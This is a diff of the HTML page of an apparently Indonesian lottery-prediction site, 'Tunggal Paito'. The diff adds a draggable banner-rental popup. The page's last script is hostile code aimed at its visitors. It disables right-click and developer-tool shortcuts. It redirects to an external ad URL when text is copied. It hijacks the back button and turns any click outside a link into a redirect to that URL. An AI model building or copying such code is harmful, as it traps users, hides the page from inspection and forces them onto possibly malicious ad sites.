@@ -7,9 +7,30 @@
 <script src=https://cdn.tailwindcss.com></script>
 <link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel=stylesheet>
-<style>body{font-family:Inter,sans-serif;background-color:#030712;color:#f3f4f6;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.ad-container{width:100%;min-height:66px;display:flex;justify-content:center;align-items:center;overflow:hidden;margin-bottom:12px}</style>
+<style>body{font-family:Inter,sans-serif;background-color:#030712;color:#f3f4f6;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.ad-container{width:100%;min-height:66px;display:flex;justify-content:center;align-items:center;overflow:hidden;margin-bottom:12px}#ads-popup{position:fixed;bottom:25px;right:15px;z-index:9999;cursor:grab;touch-action:none;filter:drop-shadow(0 15px 20px rgba(0, 0, 0, .85));transition:transform .1s ease}#ads-popup:active{cursor:grabbing}</style>
 </head>
 <body class="min-h-screen flex flex-col justify-between selection:bg-yellow-500 selection:text-slate-950">
+<div id=ads-popup>
+<div class="relative bg-gradient-to-br from-slate-900 via-slate-950 to-black border border-amber-500/40 rounded-xl p-2.5 w-44 shadow-[0_0_15px_rgba(245,158,11,0.2)] backdrop-blur-xl">
+<button onclick='document.getElementById("ads-popup").style.display="none"' class="absolute -top-1.5 -right-1.5 bg-slate-800 hover:bg-red-600 text-slate-300 hover:text-white w-5 h-5 rounded-full flex items-center justify-center text-[10px] border border-slate-700 transition-colors shadow">
+<i class="fa-solid fa-xmark"></i>
+</button>
+<div class="flex items-center space-x-1.5 mb-1.5 pb-1 border-b border-slate-800/80">
+<div class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
+<span class="text-[9px] font-bold uppercase tracking-wider text-amber-400">Sewa Banner</span>
+<span class="text-[8px] text-slate-500 ml-auto"><i class="fa-solid fa-hand text-[7px]"></i></span>
+</div>
+<div class=text-center>
+<p class="text-[10px] text-slate-300 font-medium mb-2 leading-tight">
+Pasang Iklan Traffic Tinggi!
+</p>
+<a href="https://wa.me/6288970383950?text=Halo,%20saya%20tertarik%20pasang%20banner/iklan%20di%20TunggalPaito" target=_blank class="flex items-center justify-center space-x-1 bg-gradient-to-r from-emerald-600 to-green-500 hover:from-emerald-500 hover:to-green-400 text-slate-950 font-bold py-1 px-2 rounded-lg text-[10px] shadow-[0_3px_10px_rgba(16,185,129,0.35)] transition-all">
+<i class="fa-brands fa-whatsapp text-xs"></i>
+<span>Chat Admin</span>
+</a>
+</div>
+</div>
+</div>
 <header class="w-full max-w-md mx-auto px-4 pt-4">
 <div class="text-center mb-6">
 <a href=https://tunggalpaito.online/prediksi class="inline-flex items-center space-x-2 bg-slate-900/80 border border-slate-800 px-4 py-2 rounded-full shadow-lg">
@@ -110,8 +131,6 @@ Silakan pilih menu prediksi atau fitur di bawah ini</p>
 </div>
 <i class="fa-solid fa-chevron-right text-xs text-slate-500 group-hover:text-amber-400 transition-colors"></i>
 </a>
-
-<!-- PASARAN SYDNEY -->
 <div class="bg-gradient-to-r from-slate-900 to-slate-800 border border-slate-700/60 p-4 rounded-2xl shadow-lg">
 <div class="flex items-center space-x-3 mb-3 pb-3 border-b border-slate-800">
 <div class="w-10 h-10 rounded-xl bg-yellow-500/10 flex items-center justify-center text-xl shrink-0">
@@ -137,8 +156,6 @@ Silakan pilih menu prediksi atau fitur di bawah ini</p>
 </a>
 </div>
 </div>
-
-<!-- PASARAN SINGAPORE -->
 <div class="bg-gradient-to-r from-slate-900 to-slate-800 border border-slate-700/60 p-4 rounded-2xl shadow-lg">
 <div class="flex items-center space-x-3 mb-3 pb-3 border-b border-slate-800">
 <div class="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center text-xl shrink-0">
@@ -164,8 +181,6 @@ Silakan pilih menu prediksi atau fitur di bawah ini</p>
 </a>
 </div>
 </div>
-
-<!-- PASARAN HONGKONG -->
 <div class="bg-gradient-to-r from-slate-900 to-slate-800 border border-slate-700/60 p-4 rounded-2xl shadow-lg">
 <div class="flex items-center space-x-3 mb-3 pb-3 border-b border-slate-800">
 <div class="w-10 h-10 rounded-xl bg-rose-500/10 flex items-center justify-center text-xl shrink-0">
@@ -191,8 +206,6 @@ Silakan pilih menu prediksi atau fitur di bawah ini</p>
 </a>
 </div>
 </div>
-
-<!-- PASARAN SDY LOTTO -->
 <div class="bg-gradient-to-r from-slate-900 to-slate-800 border border-slate-700/60 p-4 rounded-2xl shadow-lg">
 <div class="flex items-center space-x-3 mb-3 pb-3 border-b border-slate-800">
 <div class="w-10 h-10 rounded-xl bg-orange-500/10 flex items-center justify-center text-xl shrink-0">
@@ -210,8 +223,6 @@ Silakan pilih menu prediksi atau fitur di bawah ini</p>
 </a>
 </div>
 </div>
-
-<!-- PASARAN HK LOTTO -->
 <div class="bg-gradient-to-r from-slate-900 to-slate-800 border border-slate-700/60 p-4 rounded-2xl shadow-lg">
 <div class="flex items-center space-x-3 mb-3 pb-3 border-b border-slate-800">
 <div class="w-10 h-10 rounded-xl bg-red-500/10 flex items-center justify-center text-xl shrink-0">
@@ -229,13 +240,13 @@ Silakan pilih menu prediksi atau fitur di bawah ini</p>
 </a>
 </div>
 </div>
-
 </div>
 </main>
 <footer class="w-full max-w-md mx-auto px-4 py-6 text-center text-xs text-slate-500 border-t border-slate-900 mt-auto">
 <p>&copy; <span id=current-year></span> <strong class=text-slate-400>Tunggal Paito</strong>. All rights reserved.</p>
 </footer>
 <script>document.getElementById("current-year").textContent=(new Date).getFullYear()</script>
+<script>const popup=document.getElementById("ads-popup");let startX,startY,initialX,initialY,isDragging=!1;function dragStart(t){if(t.target.closest("a")||t.target.closest("button"))return;isDragging=!0,startX="touchstart"===t.type?t.touches[0].clientX:t.clientX,startY="touchstart"===t.type?t.touches[0].clientY:t.clientY;const e=popup.getBoundingClientRect();initialX=e.left,initialY=e.top,popup.style.bottom="auto",popup.style.right="auto",popup.style.left=initialX+"px",popup.style.top=initialY+"px"}function drag(t){if(!isDragging)return;t.preventDefault();const e="touchmove"===t.type?t.touches[0].clientX:t.clientX,n="touchmove"===t.type?t.touches[0].clientY:t.clientY,i=e-startX,o=n-startY;popup.style.left=initialX+i+"px",popup.style.top=initialY+o+"px"}function dragEnd(){isDragging=!1}popup.addEventListener("mousedown",dragStart),document.addEventListener("mousemove",drag),document.addEventListener("mouseup",dragEnd),popup.addEventListener("touchstart",dragStart,{passive:!1}),document.addEventListener("touchmove",drag,{passive:!1}),document.addEventListener("touchend",dragEnd)</script>
 <script>const adUrl="https://crypotential.com/mgccvrvt?key=b52217ccca9c3fd4b13e5d26673bceec";document.addEventListener("contextmenu",(e=>e.preventDefault())),document.onkeydown=function(e){return 123!=e.keyCode&&(!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&(!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&(!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&(!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0},document.addEventListener("copy",(e=>{e.preventDefault(),window.location.href=adUrl})),history.pushState(null,null,location.href),window.addEventListener("popstate",(function(){window.location.href=adUrl})),document.addEventListener("click",(function(e){e.target.closest("a")||(window.location.href=adUrl)}))</script>
 </body>
 </html>
